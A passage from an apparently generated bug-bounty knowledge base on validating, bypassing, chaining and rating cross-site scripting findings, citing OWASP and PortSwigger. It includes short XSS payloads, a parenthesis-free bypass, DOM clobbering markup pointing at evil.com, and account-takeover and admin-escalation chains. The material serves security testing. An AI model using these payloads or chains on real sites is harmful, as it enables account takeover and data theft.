The mechanism: stored (second-order) XSS arises when an application receives data from an untrusted source and later includes that data in its responses in an unsafe way; the defining property is that the exploit is self-contained inside the application, with the attacker placing the exploit and then simply waiting for users to encounter it. The exit points that matter are all possible HTTP responses returned to any kind of application user in any situation - not just your own. If the value only ever renders on the page the submitter is looking at (an inline confirmation, a private draft preview, a field redisplayed in the same response that submitted it), no other user ever receives the markup, no cross-user execution happens, and the correct classification is missing output encoding on a self-viewing response - at most a reflected XSS against yourself, i.e. self-XSS.
Exactly what observation kills it: after the payload is stored, enumerate every consumer of that data - list views, search results, admin dashboards, notification emails, API exports, PDF/CSV renders, other users' profile pages - and fetch each one as a DIFFERENT authenticated user (a low-privilege account viewing an admin view, and vice versa). If the marker is absent from every response other than the submitter's own, and there is no queue, export, email or webhook that carries it to a second party, the stored-XSS claim fails. If you find one response carrying the raw marker to another user, this rule is wrong and you have a real stored XSS - name that consumer in the report.

- *Disproof:* The rule is wrong if any second surface renders the stored value - an admin moderation queue, a different user's listing or profile page, a notification email, an export/CSV/PDF generator, a webhook payload or a third-party integration that re-renders the string as HTML. Any one of those makes it genuine stored XSS, because the hunter now has two distinct steps: store, then a second user's response executes it.
- *Evidence:* high_confidence — [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/stored)

**Reject a DOM-based XSS candidate when the traced attacker-controlled source only ever reaches textContent, innerText, or setAttribute with a hardcoded non-event attribute, because those sinks treat the value as text and never parse it as markup.**

Why it looks vulnerable: the hunter has proven the source is attacker-controlled (location.hash, location.search, document.referrer, postMessage data, an API field) and has seen their marker echoed back in the DOM, so the taint half of the XSS chain is already established and the report feels 90% done. The usual next step is to assume the value is dangerous because it is attacker-supplied, without ever classifying the sink it lands in.
The mechanism that kills it: execution-capable sinks are the set of APIs that PARSE their argument as markup or as script - innerHTML, outerHTML, insertAdjacentHTML, document.write, document.writeln, eval, setTimeout/setInterval with a string body, Function(), and the script.src / iframe.src style navigations. Assignment through textContent or innerText creates a single Text node; the browser never runs a tokeniser over the string, so <img onerror=...> survives only as literal characters. setAttribute(name, value) is safe only for the narrow safe-attribute list, and OWASP's XSS Prevention sheet is explicit that this safety holds only as long as the attribute NAME is hardcoded and innocuous - the moment the attribute name comes from the same tainted data (or is an event handler such as onClick/onerror/onfocus), setAttribute becomes an injection sink and the candidate is real.
Exactly what observation kills it: in DevTools, set a breakpoint on the assignment and read the call - if the property assigned is textContent/innerText, or the setAttribute second argument targets a safe name, the payload renders as literal text in the Elements panel and no dialog, no beacon request and no console error from your payload appears. Confirm with a canary: an <img src=x onerror=alert(1)> marker will appear verbatim as TEXT in the rendered node, never as an <img> element. If the same marker DOES become a real element with a live onerror handler, this rule is wrong and you have a genuine DOM XSS - which is exactly the disproof below.

- *Disproof:* The candidate is a real DOM XSS if the identical tainted value, in the identical code path, is also passed to an execution-capable sink - innerHTML/outerHTML/insertAdjacentHTML/document.write/eval/string setTimeout - anywhere the same value can reach on another page load, in a fallback branch, or for a different input shape. This rule is also wrong if setAttribute's attribute NAME is derived from the same tainted input (setAttribute(t, v) where t is user-influenced), because OWASP limits setAttribute's safety to hardcoded, innocuous attribute names; an injected name such as onmouseover re-creates an injection sink.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based)

**User input echoed verbatim into a response served with Content-Type: application/json, text/plain, or application/octet-stream is not reflected XSS unless the browser can be made to parse that response as HTML: XSS requires the payload to reach an HTML or script execution context, not merely to be reflected.**

Capture the full response header block first. The reflection is the precondition, the execution context is the finding: ZAP's reflected-XSS writeup makes the browser the actor, and the browser executes the payload because it arrived from a trusted server - a JSON body delivered as application/json is never parsed as a document, so no execution follows. Sonar's mXSS research is the relevant counter-case, showing that HTML parsing itself stays ambiguous across parsers, which is exactly why the content type and the downstream sink decide the verdict rather than the presence of angle brackets. Follow the data one more hop: if the JSON field is later assigned through an unsafe sink such as innerHTML, document.write or eval, the finding is real and belongs at the sink, not at the echo. Hunting value: this filters the API/echo/search-preview flood, since JSON APIs, GraphQL responses, plain-text status pages, CSV and file downloads and 4xx error bodies all reflect attacker input by design while never entering a document context.

- *Disproof:* It IS XSS if the same parameter also lands in an HTML response, if the Content-Type is absent or set to a sniffable value so a browser renders it as HTML, or if the API output is later written into the DOM through an unsafe sink (innerHTML, document.write, eval). Test the sink path, not the echo.
- *Evidence:* high_confidence — [sonarsource.com](https://www.sonarsource.com/blog/mxss-the-vulnerability-hiding-in-your-code/); [zaproxy.org](https://www.zaproxy.org/docs/alerts/200002-1/)

**Reject a DOM clobbering or prototype-pollution XSS candidate when the clobbered or polluted property is only read as a string into textContent, an attribute or a URL fetch, and never reaches an HTML parser or script-execution context.**

Why it looks vulnerable: you injected <img id=foo src=x onerror=alert(1)> and you can see foo now shadows a page global, or you polluted Object.prototype with a property that the application reads. Both are genuinely dangerous primitives, and prototype pollution is commonly rated as RCE - so the instinct is to report XSS. The report then quietly assumes an HTML-execution step that was never demonstrated.
The mechanism: DOM clobbering is a code-REUSE attack, not code injection. Named HTML element references come before lookups of built-in APIs on window and document, so an injected id/name collides with a security-sensitive variable and the application then uses the ELEMENT (or its string coercion) instead. The consequences depend entirely on what the application does with the clobbered value: swapped into an object property or a decision branch you get defacement, logic bugs or data exposure; the value handed to a parser or an execution primitive is where it becomes script execution. Note the concrete trap: when an object is clobbered it refers to an Element instance, which may not be the expected type - so a report claiming 'my clobbered string reached innerHTML' must show the string coercion happening first, and must show that the assignment target really is an HTML-parsing sink. A clobbered property read for a fetch URL, a feature flag or a comparison is not XSS, though it may deserve its own lower-severity finding.
Exactly what observation kills it: trace the clobbered/polluted property to its terminal use and classify that use. If it ends in textContent, a setAttribute, a fetch/URL assignment, or an if-comparison, put a breakpoint at that read and show the value being consumed as data - no element is created from it, and there is no script execution. If instead you can show the value arriving at innerHTML, insertAdjacentHTML, document.write, a script src assignment or eval, this rule is wrong: that is real XSS and the clobbering is your delivery mechanism.

- *Disproof:* The rule is wrong if the clobbered or polluted property is later assigned into an HTML-executing sink - a clobbered script src/iframe src whose value navigates to attacker markup, or a polluted property consumed by a template that renders it as HTML - because that is script execution with an injection-only primitive, and it is a real XSS. OWASP's own note that CSP mitigates clobbering of script sources but not already-present code that can be abused for execution is the same distinction seen from the mitigation side.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/dom-based)

**Reject a prototype-pollution finding reported as XSS unless the polluted property value is read back and written into an HTML-executing sink, because polluting Object.prototype alone executes no script in any page.**

Why it looks vulnerable: you can set __proto__.isAdmin or Object.prototype.polluted = '<img src=x onerror=alert(1)>' through a recursive merge and read it back on every object in the app. Prototype pollution is frequently rated critical and the tainted-looking value sits right there on the prototype - so it gets reported as stored XSS because 'the payload is in the data model'. It is not: nothing has rendered it.
The mechanism: prototype pollution is a state-corruption primitive. Writing an attacker value onto Object.prototype makes every object inherit it, which yields privilege bypass, denial of service or logic corruption depending on what the code does with the property. XSS requires the additional, separate step of that value being inserted into a document through an HTML-parsing sink - innerHTML, outerHTML, insertAdjacentHTML, document.write, a script src assignment - at which point the parser turns the characters into an element with an event handler and the browser runs it. OWASP's guidance is that pollution itself can lead to unauthorized access, privilege escalation and even remote code execution, but each of those requires a downstream gadget; the write alone is not code execution, and CVE-level severity for prototype pollution comes from the reachability of such a gadget, not from the write.
Exactly what observation kills it: after polluting, trace where the property is READ and what happens to it. Grep the codebase for the property name; if every read is a truthiness check, a config lookup, a comparison or a string that only ever reaches textContent, there is no HTML parser in the path and the finding is not XSS - report it as prototype pollution with the gadget that does exist (privilege check, deny-list, EJS/handlebars option object), or note the missing Object.create(null) / Object.freeze defences. Break in DevTools on writes to the polluted key: if no element appears in the DOM and no script executes, the rule holds. If a live element appears, this rule is wrong and it is real XSS.

- *Disproof:* The rule is wrong if the polluted property is consumed by a templating engine or a client-side render that inserts it as markup - a server-side template interpolating the inherited property, or front-end code writing it to innerHTML or a raw-HTML framework binding - because then the pollution is the injection primitive and the result is stored XSS reachable by every user of the app. Equally, if the pollution reaches a code-execution gadget (a template engine option object, a child-process invocation), that is RCE, which is a stronger finding than the XSS report claimed.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based)

**A filter that only deletes the literal string "script" from user input is not a control at all: the surrounding angle brackets survive, so the injected tag remains well-formed and still executes.**

This is the canonical example of why deny-lists fail, and it is worth internalising as a validation reflex: whenever a report says the app 'filters out script tags', check what the filter removes. A keyword-level delete leaves the '<' and '>' untouched, so the payload assembles itself after the filter runs. Rails documents the failure and the fix together: permitted-list filtering states the values allowed, and restricted lists are never complete. In the field this changes what you test - you do not conclude 'the app strips script tags, so no XSS'; you inject a split-tag payload and see whether the filter operates on the tag name, the whole element, or a substring. Note the deeper trap: a permitted-list sanitiser can still be incomplete if the allow-list itself includes a dangerous attribute or URL scheme.

- *Disproof:* The rule is false if the filter is a real parser-based sanitiser rather than a substring delete - a tokenising HTML sanitiser that rebuilds the document from a permitted list of elements and attributes neutralises the split-tag payload because the brackets are consumed as part of a rejected tag, not left orphaned. It is also false if a downstream layer re-encodes or re-parses, or if the filter strips all angle brackets rather than a keyword. And the rule is only about the filter: if the value is separately output-escaped at render time, the split payload is inert regardless of what the filter did.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html); [guides.rubyonrails.org](https://guides.rubyonrails.org/security.html)

**A reflected XSS on an anonymous, read-only page is not automatically informational; it still executes script in every visitor's origin.**

When a reflected XSS sits on a page with no authentication and no sensitive data, do not close it as brochureware only. Establish what the injected script can reach in-origin from that page: same-origin API calls the anonymous session may make, request-token exposure, and any authenticated surface reachable if a logged-in user follows a link. Rate the finding on that reach, not on page data sensitivity alone.

- *Disproof:* The page's origin exposes no authenticated state, no same-origin privileged endpoints and no tokens reachable from injected script, leaving only a bare popup.
- *Evidence:* high_confidence — [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

## 6. Known bypasses

_Filters and controls that have defeated the techniques above. Treat these as the reason a naive test fails, not as proof of safety._

**A CSP only blocks inline or foreign script execution; nonces, hashes and strict-dynamic decide whether an injected payload can still run.**

Read the Content-Security-Policy header and classify it. script-src 'self' or a domain allowlist still permits injected inline handlers when unsafe-inline is present; a nonce-based or hash-based policy blocks injected script unless the nonce is exposed in the page or a script-src JSONP-style endpoint can be abused. Then check DOM sinks that write into a nonce-bearing script element, where injected markup inherits the trusted nonce and executes.

- *Disproof:* The policy is nonce- or hash-based with an unguessable per-load nonce and no unsafe-inline, and the payload yields no element carrying a matching nonce or hash.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/content-security-policy)

**A filter blocking parentheses is bypassed by invoking the function without them, for example with a throw statement and a global exception handler.**

Character filters that remove parentheses can be defeated by calling the target function with no parentheses at all. Assigning the function to the global error handler and then throwing — onerror=alert;throw 1 — passes the argument through the exception handler instead of an argument list. Several variants exist, including ones that avoid the equals sign and the semicolon. This matters because parentheses are the single most commonly filtered character in naive XSS filters, and this bypass turns a blocked payload into a working one without any encoding trick.

- *Disproof:* This is wrong if the filter also blocks the throw keyword, the semicolon, or the equals sign, or if the application CSP forbids inline handlers so no assignment is ever reached.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**DOM clobbering turns benign injected HTML into XSS: an attacker injects markup whose id/name collides with a security-sensitive JS variable, and the browser's named-property behavior makes window.[name] resolve to an HTML element instead of the intended data. This is the XSS side-channel for sanitizers that block script tags but leave HTML in.**

(1) Vulnerable code reads a global that may be a DOM element: e.g. `const url = window.config?.apiUrl; fetch(url)`. (2) Attacker injects <form id=config><input name=apiUrl value=https://evil.com></form>; the browser now sets window.config to a form element and window.config.apiUrl returns the input value, so fetch goes to evil.com. (3) OWASP documents two canonical examples: <a id=redirectTo href='javascript:alert(1)'></a> obtains XSS from a clobbered redirectTo, and <a id=config><a id=config name=url href='malicious.js'> loads arbitrary JS via named property access. (4) DOM clobbering is the classic escape hatch when a sanitizer blocks script but leaves HTML; OWASP's DOM Clobbering Prevention Cheat Sheet states: 'attackers may still inject non-script HTML markups into webpages and transform the initially secure markup into executable code, achieving Cross-Site Scripting (XSS).'

- *Disproof:* Freeze sensitive DOM objects (Object.freeze), type-check window properties before use (instanceof), sanitize id/name attributes before insertion, or declare globals with let/const so they are not window-properties.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/DOM_Clobbering_Prevention_Cheat_Sheet.html); [codereviewlab.com](https://www.codereviewlab.com/learning/advanced-xss)

## 7. Chaining

_How this class escalates when combined with others. Each step is anchored to a promoted item._

**An anti-CSRF token provides no protection against XSS, because script executing in the victim's origin can read the token out of the page or the response and replay the state-changing request with it.**

Precondition: the target protects a state-changing endpoint with a per-session CSRF token, and you already have script execution in that origin. Step: from the injected script, read the hidden anti-CSRF field (or fetch the form page and parse the token), then issue the state-changing request from the same origin carrying that token; the server validates it exactly as it would for the legitimate user. Observation that proves the step: the protected action completes and its response is readable by the script, which a cross-site CSRF attempt could never achieve because it can neither read the token nor read the reply. Treat any CSRF token or Origin/Referer check as defeated by this precondition and score the finding on the action that succeeded, not on the token's presence.

- *Disproof:* If the state-changing request is refused with a token-validation error even when the script supplies the token read from the same page, the defence is holding and this chain link does not apply to that endpoint.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/exploiting)

**Once injected script executes in the victim's origin it inherits every action the victim's authenticated session can perform, so the impact ceiling is the victim's own account authority rather than a popup.**

Precondition: you have already proven script execution in the victim's own origin (reflected, stored or DOM), and the victim is logged in. Step: from inside the injected script, issue a same-origin request to an endpoint the victim can already reach, and observe the response body you get back. Because the script runs in the victim's origin it carries the victim's cookies and reads the reply, which is the difference that matters and the reason 'it only made a popup' is the wrong framing: a popup proves execution, a same-origin authenticated action plus its readable response proves authority. Record the request, the response status, and the state change visible on a second load of the page.

- *Disproof:* If the same-origin request made from the injected script is rejected as unauthenticated, or returns the same body as an anonymous session, then the script is not running with the victim's session authority and the claim's ceiling does not apply to that finding.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

**A stored payload submitted through a low-privilege account that later renders inside an administrator's session escalates a self-XSS into administrator compromise, and proving it requires two distinct identities.**

Precondition: a low-privileged field (name, comment, profile bio, ticket text) is stored and re-rendered unescaped in a view opened by higher-privileged users. Step 1: store the payload as user A and confirm it persists unescaped. Step 2: authenticate as user B with strictly greater privilege and open the view that renders A's data; the payload executes with B's session. Step 3: from B's context read an admin-only page or call an admin-only endpoint and observe a response a normal user could not obtain. Observation that proves the step: the privileged response or state change, not merely the marker firing. Never demonstrate this with the submitter's own session; a payload seen only by its author proves storage, not escalation.

- *Disproof:* If the payload fires only in the submitting account's own session and never renders in a second, higher-privileged user's view, then it is self-XSS and the escalation step is unproven.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/stored)

**Changing the account email address from injected script and then triggering the normal password-reset flow yields full account takeover without ever stealing a session cookie.**

Precondition: script execution in the victim's origin on a site that lets a logged-in user change their email address without re-entering the password. Step: from the script, read the CSRF token, submit the email-change request pointing the account at an address you control, then walk the ordinary password-reset flow for that address and set a new password. Observation that proves the step: the reset mail or code arrives at your address and the subsequent login with the new password succeeds as the victim. This chain is the reason a cookie-theft-only PoC understates an HttpOnly-protected target, because no cookie is ever read.

- *Disproof:* If the email-change endpoint re-authenticates the user or re-sends the current password before it will change the address, or if the reset mail still goes only to the original address, the takeover step fails and this chain link does not apply.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/exploiting)

**Client-side prototype pollution chains into DOM XSS when a polluted prototype property is later consumed as an unsafe sink value.**

Send a JSON body carrying a __proto__ key with arbitrary nested properties to any endpoint that merges objects. Then hunt for gadgets: code that reads an undefined option, tag allowlist, callback or URL property off an object and writes it into innerHTML, document.write, a script src or eval. Polluting a property a sanitizer or template allowlist consults flips that allowlist and yields execution without a direct injection point.

- *Disproof:* The merge routine rejects or ignores __proto__ and constructor keys, or no sink reads any property an attacker can pollute on Object.prototype.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html); [portswigger.net](https://portswigger.net/web-security/prototype-pollution)

## 8. Impact

_What is actually demonstrable, and what to stop claiming._

**Serving the vulnerable page over HTTPS changes nothing about the attack, because same-origin script execution is scoped by origin, and https is part of the origin definition rather than a barrier to it.**

Step: confirm the scheme of the origin hosting the vulnerable page, then run the payload there unchanged. An origin is the scheme, host and port together, so a script executing on https://example.com is inside the https://example.com origin and can reach that origin's cookies, DOM and endpoints exactly as legitimate code does. Transport security protects the channel between client and server; it says nothing about whether the bytes the server returns contain attacker-controlled script. Observation that proves the claim: the identical marker and the identical same-origin action succeed on the HTTPS origin, with no downgrade, mixed-content or certificate step involved anywhere in the chain.

- *Disproof:* If the payload only executes on a plaintext HTTP origin and the browser blocks it or the application serves different content over HTTPS, then the scheme does affect the finding and this claim does not hold for it.
- *Evidence:* high_confidence — [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html); [cwe.mitre.org](https://cwe.mitre.org/data/definitions/79.html)

**The same reflected XSS has materially higher impact on a page behind login than on an unauthenticated page, because the victim's session grants privileged in-origin actions.**

Score reflected XSS by what the victim's session can do, not by the payload. On an unauthenticated page the ceiling is whatever an anonymous session may reach. On a page behind login, document the concrete privileged actions the injected script can perform in-origin (read sensitive records, modify data, act as the victim) and note that a compromised privileged user escalates to full application control. Attach the authenticated-path proof, not just the anonymous one.

- *Disproof:* The vulnerable endpoint is reachable and exploitable only while unauthenticated, and no authenticated page on the same origin reflects the same parameter.
- *Evidence:* high_confidence — [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting)

**HTML injection in an unprivileged page is routinely rated low to medium, but injecting a link element pointing at an attacker-controlled domain escalates it into a redirect to a spoofed page that harvests credentials, or a bridge to a previously found cross-site scripting page to take cookies.**

HTML injection in an unprivileged page is routinely rated low to medium, but injecting a link element pointing at an attacker-controlled domain escalates it into a redirect to a spoofed page that harvests credentials, or a bridge to a previously found cross-site scripting page to take cookies.

HackTricks reference: html injection on password reset page (https://kathan19.gitbook.io/howtohunt/html-injection/html_injection_on_password_reset_page.md)

- *Disproof:* If the injected markup is escaped or sanitized so neither a link element nor a redirect renders, the escalation path never materialises and the finding stays at HTML injection severity.
- *Evidence:* high_confidence — [kathan19.gitbook.io](https://kathan19.gitbook.io/howtohunt/html-injection/html_injection_on_password_reset_page.md); [owasp.org](https://owasp.org/www-community/attacks/xss/); [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/contexts)

**An XSS-installed service worker outlives the 24-hour window that makes the browser bypass its cache on update checks, so a remediation claim of 'fixed within a day' is not supported until a changed script has actually been fetched, installed and activated.**

An XSS-installed service worker outlives the 24-hour window that makes the browser bypass its cache on update checks, so a remediation claim of 'fixed within a day' is not supported until a changed script has actually been fetched, installed and activated.

HackTricks reference: Abusing Service Workers (pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

- *Disproof:* A malicious worker that stops intercepting requests within 24 hours of the site serving a changed script refutes the persistence claim.
- *Evidence:* high_confidence — [portswigger.net](https://portswigger.net/web-security/cross-site-scripting/dom-based); [raw.githubusercontent.com](https://raw.githubusercontent.com/HackTricks-wiki/hacktricks/master/src/pentesting-web/xss-cross-site-scripting/abusing-service-workers.md)

---

*Generated from the evidence base. Where this file and the database disagree, the database is correct.*
